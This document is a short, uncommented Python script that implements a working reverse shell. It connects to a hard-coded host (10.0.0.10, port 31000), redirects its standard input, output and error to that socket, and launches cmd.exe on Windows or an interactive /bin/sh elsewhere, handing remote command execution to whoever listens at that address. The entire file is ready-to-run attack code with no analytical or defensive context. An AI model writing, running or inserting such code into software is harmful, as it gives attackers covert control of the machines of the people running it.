import socket,subprocess,os,platform

HOST = "10.0.0.10"
PORT = 31000

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST, PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

if platform.system() == "Windows":
    p=subprocess.call(["cmd.exe"])
else:
    p=subprocess.call(["/bin/sh","-i"])
